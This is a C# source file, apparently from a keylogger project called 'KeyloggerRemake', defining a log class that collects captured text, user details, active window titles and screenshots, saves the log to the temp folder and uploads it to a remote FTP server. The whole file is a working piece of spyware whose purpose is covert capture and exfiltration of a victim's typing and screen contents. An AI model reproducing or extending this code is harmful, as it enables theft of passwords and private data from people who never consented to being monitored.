using System;
using System.IO;
using System.Collections.Generic;
using System.Linq;

namespace KeyloggerRemake
{
    public class classLog
    {
        public string strLog;
        private string strUserInfo;
        private String strLogStartDateTime;
        public String strLogEndDateTime;
        private String strLogShortDateTime;

        public Queue<classScreenshot> stkScreenshots = new Queue<classScreenshot>();

        public classLog()
        {
            strUserInfo = classGetUserInfo.getUserInfo();
            strLogStartDateTime = classGetUserInfo.getDateAndTime();
        }

        public string addToLog(String strInfo)
        {
            strLog += strInfo;
            return strInfo;
        }

        public string printStartedLog()
        {
            return ("---------------------------------------------------------------------------------" + Environment.NewLine
                 + "KeyLogger started at: " + strLogStartDateTime
                 + strUserInfo + Environment.NewLine
                 + "---------------------------------------------------------------------------------" + Environment.NewLine);
        }

        public string printStoppedLog()
        {
            strLogEndDateTime = classGetUserInfo.getDateAndTime();

            return (Environment.NewLine 
                 + "---------------------------------------------------------------------------------" + Environment.NewLine
                 + "KeyLogger stopped at: " + strLogEndDateTime
                 + strUserInfo + Environment.NewLine
                 + "---------------------------------------------------------------------------------" + Environment.NewLine);
        }

        public string printNewWindow()
        {
            strLogShortDateTime = classGetUserInfo.getShortDTime();

            return (Environment.NewLine + "----------------------------------------------------------------------------" + Environment.NewLine
                 + "New window found at: " + strLogShortDateTime + Environment.NewLine
                 + "Window: " + classGetUserInfo.strCurrentWindow + Environment.NewLine
                 + "----------------------------------------------------------------------------" + Environment.NewLine);
        }

        public void saveLog(string strHost, string strUser, string strPass)
        {
            strLogShortDateTime = classGetUserInfo.getShortDTime();

            string strLogName = "\\Log " + strLogShortDateTime + ".txt";
            string strLogFile = Path.GetTempPath() + strLogName;

            using (StreamWriter swWriter = new StreamWriter(strLogFile))
            {
                swWriter.Write(strLog);
            }

            classFTP.uploadLog(strHost, strUser, strPass, strLogName, strLogFile);
        }
        
        public bool screenshotExists(string strScreenshotName)
        {
            bool blScreenshotExists = stkScreenshots.Any(s => s.strScreenshotName == strScreenshotName);

            return blScreenshotExists;
        }       
    }
}
